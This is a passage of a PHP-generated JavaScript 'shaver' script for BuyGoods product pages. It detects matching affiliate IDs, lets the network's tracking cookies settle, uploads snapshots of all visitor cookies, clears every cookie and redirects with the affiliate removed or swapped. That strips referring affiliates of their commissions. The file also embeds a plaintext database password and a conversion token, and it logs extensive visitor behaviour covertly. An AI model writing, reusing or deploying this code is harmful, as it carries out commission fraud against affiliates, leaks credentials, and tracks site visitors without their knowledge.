<?php
/**
 * Single-Tenant Shaving Check Script (v3 — Cookie-Poll-Clear-Redirect)
 *
 * BuyGoods-only version for Meta Trim product pages.
 * Hardcoded account: 11943
 *
 * Flow:
 *  1) No aff_id or no shaver match → inject BG tracking normally
 *  2) Shaver match (remove)  → inject BG → wait cookies stable → clear all → redirect clean URL
 *  3) Shaver match (replace) → inject BG → wait cookies stable → clear all → redirect with replaced params
 */

header('Content-Type: application/javascript; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');

// Database configuration
define('DB_HOST', 'localhost');
define('DB_NAME', 'u373133718_shavingdb');
define('DB_USER', 'u373133718_shavingdbuser');
define('DB_PASS', 'Ali547$$$');

$sessions = [];
try {
    $pdo = new PDO(
        "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=utf8mb4",
        DB_USER, DB_PASS,
        [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
    );
    $stmt = $pdo->query("SELECT id, aff_id, sub_id, replace_mode, replace_aff_id, replace_sub_id FROM shaving_sessions WHERE active = 1");
    $sessions = $stmt->fetchAll(PDO::FETCH_ASSOC);
} catch (PDOException $e) {
    $sessions = [];
}

$sessionsJson = json_encode(array_map(function($s) {
    return [
        'id' => $s['id'],
        'affId' => $s['aff_id'],
        'subId' => $s['sub_id'] ?? '',
        'replaceMode' => (bool)$s['replace_mode'],
        'replaceAffId' => $s['replace_aff_id'] ?? '',
        'replaceSubId' => $s['replace_sub_id'] ?? ''
    ];
}, $sessions));

$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$host = $_SERVER['HTTP_HOST'];
$path = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');
$apiUrl = $protocol . '://' . $host . $path . '/api.php';
?>
/**
 * Single-Tenant Shaver v3 — Cookie-Poll-Clear-Redirect (BuyGoods Only)
 * Generated: <?php echo date('Y-m-d H:i:s'); ?>

 * Active Sessions: <?php echo count($sessions); ?>

 */
(function() {
    'use strict';

    // ============================================================
    // CONFIG
    // ============================================================
    var sessions = <?php echo $sessionsJson; ?>;
    var API_URL = '<?php echo $apiUrl; ?>';
    var BG_ACCOUNT_ID = '11943';
    var BG_PRODUCT_CODES = 'met2v2,met3v2,met6v2,met2v2s,met6v2s,met3v2s';
    var BG_CONVERSION_TOKEN = '6bea6c7c7a71a36b83e176af6f6189de';

    // Timing config
    var STABLE_SECS    = 3;
    var MAX_WAIT_MS    = 15000;
    var POLL_MS        = 500;
    var SHAVER_FLAG    = '_shaver_cleaned';

    // ============================================================
    // CONSOLE LOGGING
    // ============================================================
    console.log('%c[Shaver] Loaded', 'color:#3498db;font-weight:bold', sessions.length, 'active sessions | BuyGoods Mode | Account:', BG_ACCOUNT_ID);

    // ============================================================
    // LOOP PREVENTION
    // ============================================================
    var alreadyCleaned = false;
    try { alreadyCleaned = sessionStorage.getItem(SHAVER_FLAG) === '1'; } catch(e) {}
    if (alreadyCleaned) {
        try { sessionStorage.removeItem(SHAVER_FLAG); } catch(e) {}
        console.log('%c[Shaver] Post-redirect clean visit — normal BG tracking will load', 'color:#2ecc71;font-weight:bold');

        // Send AFTER snapshot to server after BG sets new cookies (matched by IP+UA on server)
        setTimeout(function() { sendAfterSnapshot(); }, 5000);
        console.log('%c[Shaver] Will send AFTER snapshot in 5s (IP-matched on server)', 'color:#9b59b6;font-weight:bold');
    }

    // ============================================================
    // URL PARAMETER PARSING
    // ============================================================
    function getUrlParams() {
        var params = {};
        var search = window.location.search.substring(1);
        if (!search) return params;
        var pairs = search.split('&');
        for (var i = 0; i < pairs.length; i++) {
            var pair = pairs[i].split('=');
            var key = decodeURIComponent(pair[0]);
            var value = pair[1] ? decodeURIComponent(pair[1]) : '';
            params[key] = value;
        }
        return params;
    }

    // ============================================================
    // PAGE TYPE DETECTION
    // ============================================================
    function detectPageType() {
        var path = window.location.pathname.toLowerCase();
        if (path.indexOf('/upsell') !== -1) return 'upsell';
        if (path.indexOf('/thankyou') !== -1 || path.indexOf('/thank-you') !== -1 ||
            path.indexOf('/thank_you') !== -1 || path.indexOf('/confirmation') !== -1 ||
            path.indexOf('/order-confirmation') !== -1) return 'thankyou';
        return 'landing';
    }
    var PAGE_TYPE = detectPageType();
    if (PAGE_TYPE !== 'landing') {
        console.log('%c[Shaver] Page Type: ' + PAGE_TYPE.toUpperCase(), 'color:#2ecc71;font-weight:bold;font-size:12px');
    }

    // ============================================================
    // SESSION MATCHING
    // ============================================================
    function findSession(affId, subId) {
        for (var i = 0; i < sessions.length; i++) {
            var s = sessions[i];
            if (s.affId === affId) {
                if (s.subId && s.subId !== subId) continue;
                return s;
            }
        }
        return null;
    }

    // ============================================================
    // COOKIE UTILITIES
    // ============================================================
    function cookieCount() {
        return document.cookie ? document.cookie.split(';').filter(function(c) { return c.trim(); }).length : 0;
    }

    function getDomains() {
        var h = window.location.hostname;
        var parts = h.split('.');
        var domains = ['', h, '.' + h];
        for (var i = 1; i < parts.length - 1; i++) {
            var d = parts.slice(i).join('.');
            domains.push(d, '.' + d);
        }
        var seen = {};
        return domains.filter(function(d) {
            if (seen[d]) return false;
            seen[d] = true;
            return true;
        });
    }

    function clearAllCookies() {
        var domains = getDomains();
        var paths = ['/', window.location.pathname, ''];
        var exp = 'Thu, 01 Jan 1970 00:00:00 UTC';
        var cookies = document.cookie.split(';');
        var cleared = 0;
        for (var ci = 0; ci < cookies.length; ci++) {
            var name = cookies[ci].split('=')[0].trim();
            if (!name) continue;
            for (var di = 0; di < domains.length; di++) {
                for (var pi = 0; pi < paths.length; pi++) {
                    document.cookie = name + '=; expires=' + exp + '; path=' + paths[pi] + (domains[di] ? '; domain=' + domains[di] : '');
                }
            }
            cleared++;
        }
        var remaining = cookieCount();
        console.log('[Shaver] Cleared ' + cleared + ' cookies. ' + remaining + ' survived.');
        if (remaining > 0) {
            document.cookie.split(';').forEach(function(c) {
                var k = c.split('=')[0].trim();
                if (k) console.log('%c[Shaver] SURVIVED: ' + k, 'color:#e74c3c');
            });
        }
        return remaining;
    }

    // ============================================================
    // COOKIE READER (required by BuyGoods)
    // ============================================================
    function ReadCookie(name) {
        name += '=';
        var parts = document.cookie.split(/;\s*/);
        for (var i = 0; i < parts.length; i++) {
            var part = parts[i];
            if (part.indexOf(name) === 0) return part.substring(name.length);
        }
        return '';
    }
    window.ReadCookie = ReadCookie;

    // ============================================================
    // TRACKING FUNCTIONS
    // ============================================================
    function trackVisit(session, affId, subId) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', API_URL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            action: 'track_visit',
            session_id: session.id,
            aff_id: affId,
            sub_id: subId,
            page: window.location.href,
            referrer: document.referrer || 'direct'
        }));
    }

    function logTraffic(affId, subId, wasShaved, shavingSessionId, source) {
        var trafficSource = source || document.referrer || 'direct';
        var sessid2Val = ReadCookie('sessid2');
        if (!sessid2Val) {
            var sp = new URLSearchParams(window.location.search);
            sessid2Val = sp.get('sessid2') || sp.get('sessid') || '';
        }

        var payload = JSON.stringify({
            action: 'log_traffic',
            aff_id: affId || '',
            sub_id: subId,
            page_url: window.location.href,
            page_type: PAGE_TYPE,
            sessid2: sessid2Val || null,
            referrer: trafficSource,
            user_agent: navigator.userAgent,
            was_shaved: wasShaved,
            shaving_session_id: shavingSessionId,
            session_uuid: window.__behaviorTracking ? window.__behaviorTracking.sessionUUID : null,
            screen_width: window.screen.width,
            screen_height: window.screen.height,
            viewport_width: window.innerWidth,
            viewport_height: window.innerHeight,
            is_bot: window.__behaviorTracking ? window.__behaviorTracking.isBot : 0,
            bot_flags: window.__behaviorTracking ? window.__behaviorTracking.botFlags : null,
            is_iframe: window.__behaviorTracking ? window.__behaviorTracking.isIframe : 0
        });

        var xhr = new XMLHttpRequest();
        xhr.open('POST', API_URL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                try {
                    var result = JSON.parse(xhr.responseText);
                    if (result.success && result.traffic_id && window.__behaviorTracking) {
                        window.__behaviorTracking.trafficId = result.traffic_id;
                        window.__behaviorTracking.trafficLogged = true;
                        if (window.__behaviorTracking.eventQueue.length > 0) {
                            window.__behaviorTracking.eventQueue.forEach(function(event) {
                                logBehaviorEvent(event.eventType, event.eventData);
                            });
                            window.__behaviorTracking.eventQueue = [];
                        }
                    }
                } catch (e) {}
            }
        };
        xhr.send(payload);

        window.__pendingTrafficPayload = payload;
        window.addEventListener('beforeunload', function __trafficFallback() {
            if (!window.__behaviorTracking || !window.__behaviorTracking.trafficLogged) {
                if (navigator.sendBeacon) navigator.sendBeacon(API_URL, window.__pendingTrafficPayload);
            }
            window.removeEventListener('beforeunload', __trafficFallback);
        });
    }

    function trackClick(session, affId, subId) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', API_URL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            action: 'track_click',
            session_id: session.id,
            aff_id: affId,
            sub_id: subId,
            page: window.location.href
        }));
    }

    // ============================================================
    // BEHAVIOR TRACKING SYSTEM
    // ============================================================
    function getSessionUUID() {
        var uuid = null;
        try { uuid = sessionStorage.getItem('_behavior_session_id'); } catch (e) {}
        if (!uuid) {
            uuid = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            try { sessionStorage.setItem('_behavior_session_id', uuid); } catch (e) {}
        }
        return uuid;
    }

    window.__behaviorTracking = {
        sessionUUID: getSessionUUID(),
        trafficId: null,
        landedAt: Date.now(),
        maxScrollDepth: 0,
        clickCount: 0,
        hasReachedCheckout: false,
        eventQueue: [],
        isTabVisible: true,
        lastScrollTime: 0,
        firstClickTime: null,
        checkoutTime: null,
        checkoutUrl: null,
        pageLoadTime: window.performance ? (window.performance.timing.loadEventEnd - window.performance.timing.navigationStart) : null,
        isBot: 0,
        botFlags: null,
        isIframe: 0,
        hasAdblock: null,
        jsErrorCount: 0,
        jsErrors: [],
        trafficLogged: false
    };

    // Bot detection
    (function() {
        var flags = [];
        if (navigator.webdriver) flags.push('webdriver');
        if (navigator.plugins && navigator.plugins.length === 0) flags.push('no_plugins');
        if (!navigator.languages || navigator.languages.length === 0) flags.push('no_languages');
        if (/Chrome/.test(navigator.userAgent) && !window.chrome) flags.push('missing_chrome');
        if (/HeadlessChrome/.test(navigator.userAgent)) flags.push('headless_chrome');
        if (window.callPhantom || window._phantom) flags.push('phantomjs');
        window.__behaviorTracking.isBot = flags.length > 0 ? 1 : 0;
        window.__behaviorTracking.botFlags = flags.length > 0 ? flags.join(',') : null;
    })();

    try { window.__behaviorTracking.isIframe = (window.self !== window.top) ? 1 : 0; }
    catch (e) { window.__behaviorTracking.isIframe = 1; }

    // Ad blocker detection
    function detectAdBlocker() {
        var bait = document.createElement('div');
        bait.id = 'ad-banner';
        bait.className = 'ad ads adsbox ad-placement doubleclick';
        bait.style.cssText = 'position:absolute;top:-10px;left:-10px;width:1px;height:1px;overflow:hidden;';
        bait.innerHTML = '&nbsp;';
        document.body.appendChild(bait);
        setTimeout(function() {
            var blocked = 0;
            try {
                if (!bait.offsetParent || bait.offsetHeight === 0 || bait.clientHeight === 0 ||
                    getComputedStyle(bait).display === 'none' || getComputedStyle(bait).visibility === 'hidden') {
                    blocked = 1;
                }
            } catch(e) { blocked = 1; }
            window.__behaviorTracking.hasAdblock = blocked;
            if (bait.parentNode) bait.parentNode.removeChild(bait);
        }, 150);
    }
    if (document.readyState === 'loading') { document.addEventListener('DOMContentLoaded', detectAdBlocker); }
    else { detectAdBlocker(); }

    // JS error tracking
    window.addEventListener('error', function(e) {
        window.__behaviorTracking.jsErrorCount++;
        if (window.__behaviorTracking.jsErrors.length < 5) {
            window.__behaviorTracking.jsErrors.push({ msg: (e.message || '').substring(0, 200), src: (e.filename || '').substring(0, 150), line: e.lineno || 0 });
        }
    });
    window.addEventListener('unhandledrejection', function(e) {
        window.__behaviorTracking.jsErrorCount++;
        if (window.__behaviorTracking.jsErrors.length < 5) {
            var reason = ''; try { reason = String(e.reason).substring(0, 200); } catch(ex) { reason = 'unknown'; }
            window.__behaviorTracking.jsErrors.push({ msg: reason, src: 'promise', line: 0 });
        }
    });

    function logBehaviorEvent(eventType, eventData) {
        if (!window.__behaviorTracking.trafficId) {
            window.__behaviorTracking.eventQueue.push({ eventType: eventType, eventData: eventData, timestamp: Date.now() });
            return;
        }
        var xhr = new XMLHttpRequest();
        xhr.open('POST', API_URL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            action: 'log_behavior_event',
            traffic_id: window.__behaviorTracking.trafficId,
            session_uuid: window.__behaviorTracking.sessionUUID,
            event_type: eventType, event_data: eventData,
            timestamp: new Date().toISOString()
        }));
    }

    function updateSessionMetrics() {
        if (!window.__behaviorTracking.trafficId) return;
        var sessionDuration = Math.floor((Date.now() - window.__behaviorTracking.landedAt) / 1000);
        var xhr = new XMLHttpRequest();
        xhr.open('POST', API_URL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            action: 'update_session_metrics',
            traffic_id: window.__behaviorTracking.trafficId,
            session_duration: sessionDuration,
            max_scroll_depth: window.__behaviorTracking.maxScrollDepth,
            total_clicks: window.__behaviorTracking.clickCount,
            reached_checkout: window.__behaviorTracking.hasReachedCheckout ? 1 : 0,
            checkout_url: window.__behaviorTracking.checkoutUrl || null,
            time_to_first_click: window.__behaviorTracking.firstClickTime ? Math.floor((window.__behaviorTracking.firstClickTime - window.__behaviorTracking.landedAt) / 1000) : null,
            time_to_checkout: window.__behaviorTracking.checkoutTime ? Math.floor((window.__behaviorTracking.checkoutTime - window.__behaviorTracking.landedAt) / 1000) : null,
            screen_width: window.screen.width, screen_height: window.screen.height,
            viewport_width: window.innerWidth, viewport_height: window.innerHeight,
            page_load_time: window.__behaviorTracking.pageLoadTime,
            bounce: window.__behaviorTracking.clickCount === 0 ? 1 : 0,
            has_adblock: window.__behaviorTracking.hasAdblock,
            js_error_count: window.__behaviorTracking.jsErrorCount,
            js_errors: window.__behaviorTracking.jsErrors.length > 0 ? JSON.stringify(window.__behaviorTracking.jsErrors) : null
        }));
    }

    // Scroll tracking
    function setupScrollTracking() {
        var scrollTimeout, lastDepth = 0;
        window.addEventListener('scroll', function() {
            clearTimeout(scrollTimeout);
            scrollTimeout = setTimeout(function() {
                var scrollY = window.scrollY || window.pageYOffset;
                var docHeight = document.documentElement.scrollHeight;
                var viewportHeight = window.innerHeight;
                var scrollDepth = Math.min(100, Math.floor(((scrollY + viewportHeight) / docHeight) * 100));
                if (scrollDepth > window.__behaviorTracking.maxScrollDepth) {
                    window.__behaviorTracking.maxScrollDepth = scrollDepth;
                    if (scrollDepth >= 25 && lastDepth < 25) logBehaviorEvent('scroll', {scrollDepth: 25, milestone: true});
                    else if (scrollDepth >= 50 && lastDepth < 50) logBehaviorEvent('scroll', {scrollDepth: 50, milestone: true});
                    else if (scrollDepth >= 75 && lastDepth < 75) logBehaviorEvent('scroll', {scrollDepth: 75, milestone: true});
                    else if (scrollDepth >= 90 && lastDepth < 90) logBehaviorEvent('scroll', {scrollDepth: 90, milestone: true});
                    lastDepth = scrollDepth;
                }
            }, 300);
        });
    }

    // Click tracking
    function setupDetailedClickTracking() {
        document.addEventListener('click', function(e) {
            var target = e.target;
            while (target && target !== document.body) {
                if (target.tagName === 'A' || target.tagName === 'BUTTON' ||
                    (target.classList && (target.classList.contains('cp-btn') || target.classList.contains('mt-buy-now-btn')))) {
                    window.__behaviorTracking.clickCount++;
                    if (!window.__behaviorTracking.firstClickTime) window.__behaviorTracking.firstClickTime = Date.now();
                    logBehaviorEvent('click', {
                        buttonText: (target.textContent || '').trim().substring(0, 100),
                        buttonId: target.id || '',
                        targetUrl: (target.href || '').substring(0, 200),
                        clickX: e.clientX, clickY: e.clientY,
                        scrollDepthAtClick: window.__behaviorTracking.maxScrollDepth,
                        timeFromLanding: Math.floor((Date.now() - window.__behaviorTracking.landedAt) / 1000)
                    });
                    break;
                }
                target = target.parentElement;
            }
        });
    }

    // Hover tracking on buy buttons
    function setupHoverTracking() {
        var hoverStartTime = null, hoveredButton = null;
        document.addEventListener('mouseover', function(e) {
            var target = e.target;
            while (target && target !== document.body) {
                if (target.classList && (target.classList.contains('cp-btn') || target.classList.contains('mt-buy-now-btn'))) {
                    hoverStartTime = Date.now(); hoveredButton = target; break;
                }
                target = target.parentElement;
            }
        });
        document.addEventListener('mouseout', function(e) {
            if (hoveredButton && hoverStartTime) {
                var duration = Date.now() - hoverStartTime;
                if (duration > 500) logBehaviorEvent('hover', { element: 'buy-btn', buttonText: (hoveredButton.textContent || '').trim().substring(0, 100), duration: duration });
                hoverStartTime = null; hoveredButton = null;
            }
        });
    }

    // Checkout detection
    function setupCheckoutDetection() {
        var originalPushState = history.pushState;
        if (originalPushState) {
            history.pushState = function() {
                if (arguments[2]) checkIfCheckoutReached(arguments[2]);
                return originalPushState.apply(history, arguments);
            };
        }
        window.addEventListener('popstate', function() { checkIfCheckoutReached(window.location.href); });
        document.addEventListener('click', function(e) {
            var target = e.target;
            while (target && target !== document.body) {
                if (target.href && target.href.indexOf('buygoods.com') !== -1) {
                    if (!window.__behaviorTracking.hasReachedCheckout) {
                        window.__behaviorTracking.hasReachedCheckout = true;
                        window.__behaviorTracking.checkoutUrl = target.href;
                        window.__behaviorTracking.checkoutTime = Date.now();
                        logBehaviorEvent('checkout_reached', {
                            checkoutUrl: target.href.substring(0, 200),
                            timeToCheckout: Math.floor((Date.now() - window.__behaviorTracking.landedAt) / 1000),
                            scrollDepthAtCheckout: window.__behaviorTracking.maxScrollDepth,
                            clicksBeforeCheckout: window.__behaviorTracking.clickCount
                        });
                    }
                    break;
                }
                target = target.parentElement;
            }
        });
    }
    function checkIfCheckoutReached(url) {
        if (url && url.indexOf('buygoods.com') !== -1 && !window.__behaviorTracking.hasReachedCheckout) {
            window.__behaviorTracking.hasReachedCheckout = true;
            window.__behaviorTracking.checkoutUrl = url;
            window.__behaviorTracking.checkoutTime = Date.now();
            logBehaviorEvent('checkout_reached', { checkoutUrl: url.substring(0, 200), timeToCheckout: Math.floor((Date.now() - window.__behaviorTracking.landedAt) / 1000) });
        }
    }

    // Tab visibility
    function setupTabVisibilityTracking() {
        var visibleStart = Date.now();
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                logBehaviorEvent('tab_hidden', { hidden: true, visibleDuration: Date.now() - visibleStart });
                window.__behaviorTracking.isTabVisible = false;
            } else {
                logBehaviorEvent('tab_visible', { hidden: false });
                window.__behaviorTracking.isTabVisible = true;
                visibleStart = Date.now();
            }
        });
    }

    // Before unload
    function setupBeforeUnload() {
        window.addEventListener('beforeunload', function() {
            updateSessionMetrics();
            if (navigator.sendBeacon && window.__behaviorTracking.trafficId) {
                navigator.sendBeacon(API_URL, JSON.stringify({
                    action: 'update_session_metrics',
                    traffic_id: window.__behaviorTracking.trafficId,
                    session_duration: Math.floor((Date.now() - window.__behaviorTracking.landedAt) / 1000),
                    max_scroll_depth: window.__behaviorTracking.maxScrollDepth,
                    total_clicks: window.__behaviorTracking.clickCount,
                    reached_checkout: window.__behaviorTracking.hasReachedCheckout ? 1 : 0,
                    has_adblock: window.__behaviorTracking.hasAdblock,
                    js_error_count: window.__behaviorTracking.jsErrorCount,
                    js_errors: window.__behaviorTracking.jsErrors.length > 0 ? JSON.stringify(window.__behaviorTracking.jsErrors) : null
                }));
            }
        });
    }

    setInterval(updateSessionMetrics, 30000);

    function initBehaviorTracking() {
        setupScrollTracking();
        setupDetailedClickTracking();
        setupHoverTracking();
        setupCheckoutDetection();
        setupTabVisibilityTracking();
        setupBeforeUnload();
    }
    if (document.readyState === 'loading') { document.addEventListener('DOMContentLoaded', initBehaviorTracking); }
    else { initBehaviorTracking(); }

    // ============================================================
    // BUYGOODS TRACKING INJECTION
    // ============================================================
    var bgTrackingInjected = false;

    function injectBGTracking() {
        if (bgTrackingInjected) return;
        bgTrackingInjected = true;

        var bgSrc = "https://tracking.buygoods.com/track/?a=" + BG_ACCOUNT_ID
            + "&firstcookie=0&tracking_redirect=&referrer=" + encodeURIComponent(document.referrer)
            + "&sessid2=" + ReadCookie('sessid2')
            + "&product=" + BG_PRODUCT_CODES
            + "&vid1=&vid2=&vid3=&caller_url=" + encodeURIComponent(window.location.href);

        var bgScript = document.createElement('script');
        bgScript.type = 'text/javascript';
        bgScript.src = bgSrc;
        bgScript.onload = function() {
            console.log('[Shaver] BuyGoods tracking loaded');
            setTimeout(ensureSessid2OnLinks, 300);
            setTimeout(ensureSessid2OnLinks, 1500);
            setTimeout(ensureSessid2OnLinks, 3000);
            if (typeof MutationObserver !== 'undefined') {
                var linkObserver = new MutationObserver(function() { ensureSessid2OnLinks(); });
                linkObserver.observe(document.body || document.documentElement, { childList: true, subtree: true });
                setTimeout(function() { linkObserver.disconnect(); }, 10000);
            }
        };
        document.head.appendChild(bgScript);
        console.log('[Shaver] BuyGoods tracking injected (DOM ready)');

        // Conversion iframe
        if (BG_CONVERSION_TOKEN) {
            setTimeout(function() {
                var i = document.createElement("iframe");
                i.style.display = "none";
                i.setAttribute("src", "https://buygoods.com/affiliates/go/conversion/iframe/bg?a=" + BG_ACCOUNT_ID + "&t=" + BG_CONVERSION_TOKEN + "&s=" + ReadCookie('sessid2'));
                if (document.body) document.body.appendChild(i);
            }, 1000);
        }
    }

    // ============================================================
    // SESSID2 ON BUY LINKS
    // ============================================================
    function ensureSessid2OnLinks() {
        var sessid2 = ReadCookie('sessid2');
        if (!sessid2) return;
        var links = document.querySelectorAll('a[href*="buygoods.com"]');
        var updated = 0;
        links.forEach(function(link) {
            var href = link.getAttribute('href');
            if (!href) return;
            if (href.indexOf('sessid2=') !== -1) {
                var newHref = href.replace(/sessid2=[^&]*/, 'sessid2=' + sessid2);
                if (newHref !== href) link.setAttribute('href', newHref);
                updated++;
            } else {
                var sep = href.indexOf('?') !== -1 ? '&' : '?';
                link.setAttribute('href', href + sep + 'sessid2=' + sessid2);
                updated++;
            }
        });
        if (updated > 0) {
            console.log('%c[Shaver] sessid2 applied to ' + updated + ' buy link(s)', 'color:#3498db;font-weight:bold', '| sessid2:', sessid2);
        }
    }

    // ============================================================
    // BEFORE/AFTER SNAPSHOT CAPTURE (stored remotely, matched by IP+UA)
    // ============================================================
    function captureSnapshot() {
        var snapshot = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            cookies: {},
            cookieCount: 0,
            sessid2: '',
            urlParams: {}
        };
        if (document.cookie) {
            var parts = document.cookie.split(';');
            for (var i = 0; i < parts.length; i++) {
                var c = parts[i].trim();
                if (!c) continue;
                var eq = c.indexOf('=');
                var name = eq > -1 ? c.substring(0, eq) : c;
                var value = eq > -1 ? c.substring(eq + 1) : '';
                snapshot.cookies[name] = value;
                snapshot.cookieCount++;
            }
        }
        snapshot.sessid2 = snapshot.cookies['sessid2'] || '';
        var search = window.location.search.substring(1);
        if (search) {
            var pairs = search.split('&');
            for (var i = 0; i < pairs.length; i++) {
                var pair = pairs[i].split('=');
                snapshot.urlParams[decodeURIComponent(pair[0])] = pair[1] ? decodeURIComponent(pair[1]) : '';
            }
        }
        return snapshot;
    }

    function sendBeforeSnapshot(snapshot, session) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', API_URL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            action: 'log_shave_snapshot',
            phase: 'before',
            domain_id: 0,
            session_id: session.id,
            aff_id: session.affId,
            sub_id: session.subId || '',
            mode: session.replaceMode ? 'replace' : 'remove',
            replace_aff_id: session.replaceAffId || '',
            replace_sub_id: session.replaceSubId || '',
            url: snapshot.url,
            sessid2: snapshot.sessid2,
            cookies: JSON.stringify(snapshot.cookies),
            cookie_count: snapshot.cookieCount,
            url_params: JSON.stringify(snapshot.urlParams),
            platform: 'buygoods'
        }));
        console.log('%c[Shaver] BEFORE snapshot sent to server', 'color:#9b59b6;font-weight:bold',
            '| cookies:', snapshot.cookieCount, '| sessid2:', snapshot.sessid2 || '(none)');
    }

    function sendAfterSnapshot() {
        var snapshot = captureSnapshot();
        var xhr = new XMLHttpRequest();
        xhr.open('POST', API_URL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            action: 'log_shave_snapshot',
            phase: 'after',
            domain_id: 0,
            url: snapshot.url,
            sessid2: snapshot.sessid2,
            cookies: JSON.stringify(snapshot.cookies),
            cookie_count: snapshot.cookieCount,
            url_params: JSON.stringify(snapshot.urlParams)
        }));
        console.log('%c[Shaver] AFTER snapshot sent to server', 'color:#9b59b6;font-weight:bold',
            '| cookies:', snapshot.cookieCount, '| sessid2:', snapshot.sessid2 || '(none)');
    }

    // ============================================================
    // COOKIE POLL → CLEAR → REDIRECT (the core shaving mechanism)
    // ============================================================
    function waitForCookiesThenClean(session) {
        console.log('%c[Shaver] Step 1: BG tracking injected — waiting for cookies to stabilize...', 'color:#f39c12;font-weight:bold');

        var elapsed    = 0;
        var lastCount  = -1;
        var stableTime = 0;
        var STABLE_MS  = STABLE_SECS * 1000;

        var watcher = setInterval(function() {
            elapsed += POLL_MS;
            var cnt = cookieCount();

            if (cnt > 0 && cnt === lastCount) {
                stableTime += POLL_MS;
                console.log('[Shaver] Cookies: ' + cnt + ' — stable ' + (stableTime / 1000).toFixed(1) + 's / ' + STABLE_SECS + 's');
            } else {
                if (cnt !== lastCount && lastCount !== -1) {
                    console.log('[Shaver] Cookie count changed: ' + lastCount + ' → ' + cnt);
                }
                stableTime = 0;
            }
            lastCount = cnt;

            var shouldProceed = (stableTime >= STABLE_MS && cnt > 0) || (elapsed >= MAX_WAIT_MS);

            if (shouldProceed) {
                clearInterval(watcher);
                if (stableTime >= STABLE_MS) {
                    console.log('%c[Shaver] Step 2: Cookies stable at ' + cnt + ' for ' + STABLE_SECS + 's!', 'color:#2ecc71;font-weight:bold');
                } else {
                    console.log('%c[Shaver] Step 2: Timeout after ' + (elapsed / 1000) + 's — proceeding with ' + cnt + ' cookies', 'color:#f39c12;font-weight:bold');
                }
                performCleanAndRedirect(session);
            }
        }, POLL_MS);
    }

    function performCleanAndRedirect(session) {
        // ── Capture BEFORE snapshot and send to server (matched by IP+UA) ──
        var beforeSnap = captureSnapshot();
        sendBeforeSnapshot(beforeSnap, session);

        // Step 3: Clear all cookies
        console.log('%c[Shaver] Step 3: Clearing ALL cookies...', 'color:#e74c3c;font-weight:bold');
        clearAllCookies();

        // Set flag to prevent loop
        try { sessionStorage.setItem(SHAVER_FLAG, '1'); } catch(e) {}

        // Step 4: Build redirect URL
        var url = new URL(window.location.href);

        if (session.replaceMode) {
            url.searchParams.set('aff_id', session.replaceAffId);
            if (session.replaceSubId) url.searchParams.set('subid', session.replaceSubId);
            else url.searchParams.delete('subid');
            console.log('%c[Shaver] Step 4: Redirecting with REPLACED params → aff: ' + session.replaceAffId, 'color:#f39c12;font-weight:bold');
        } else {
            url.searchParams.delete('aff_id');
            url.searchParams.delete('affid');
            url.searchParams.delete('subid');
            url.searchParams.delete('sub_id');
            console.log('%c[Shaver] Step 4: Redirecting with CLEAN URL (affiliate removed)', 'color:#e74c3c;font-weight:bold');
        }

        console.log('[Shaver] Redirect URL:', url.toString());
        window.location.href = url.toString();
    }

    // ============================================================
    // ███ MAIN LOGIC ███
    // ============================================================
    var params = getUrlParams();
    var utmSource = params.utm_source || params.source || params.ref || '';
    var affId = params.aff_id || params.affid || '';
    var subId = params.subid || params.sub_id || '';

    console.log('%c[Shaver] ═══ BuyGoods Engine Started ═══', 'color:#3498db;font-weight:bold;font-size:12px');
    console.log('[Shaver] BG Params Detected:');
    console.log('  → aff_id:', affId || '(empty)');
    console.log('  → subid:', subId || '(empty)');
    console.log('  → Current URL:', window.location.href);

    if (PAGE_TYPE !== 'landing') {
        // === UPSELL / THANK YOU — skip shaving, just log ===
        console.log('%c[Shaver] ' + PAGE_TYPE.toUpperCase() + ' page — skipping shaving', 'color:#2ecc71;font-weight:bold');
        if (!affId) {
            try { affId = sessionStorage.getItem('_shaver_aff_id') || ''; } catch(e) {}
            try { subId = subId || sessionStorage.getItem('_shaver_sub_id') || ''; } catch(e) {}
        }
        logTraffic(affId, subId, false, null, utmSource);

    } else if (alreadyCleaned) {
        // === POST-REDIRECT CLEAN VISIT — BG tracks normally ===
        logTraffic(affId, subId, false, null, utmSource);
        console.log('[Shaver] No affiliate param detected — organic/direct visit');

    } else if (affId) {
        // === LANDING PAGE WITH AFF_ID — check for shaver match ===
        try {
            sessionStorage.setItem('_shaver_aff_id', affId);
            sessionStorage.setItem('_shaver_sub_id', subId);
        } catch(e) {}

        console.log('[Shaver] Matching affiliate against sessions...');
        var session = findSession(affId, subId);

        if (session) {
            // ██ SHAVER MATCH! ██
            var action = session.replaceMode ? 'REPLACED → ' + session.replaceAffId : 'REMOVED';
            console.log('%c[Shaver] ✔ MATCH FOUND!', 'color:#e74c3c;font-weight:bold;font-size:12px',
                '| aff_id:', affId, '| Action:', action);

            logTraffic(affId, subId, true, session.id, utmSource);
            trackVisit(session, affId, subId);

            window.__shavingSession = session;
            window.__shavingOriginalAffId = affId;
            window.__shavingOriginalSubId = subId;

            // Step 1: Inject BG tracking with ORIGINAL URL (dirty aff_id)
            injectBGTracking();

            // Steps 2-4: Wait for cookies to stabilize → clear → redirect
            waitForCookiesThenClean(session);

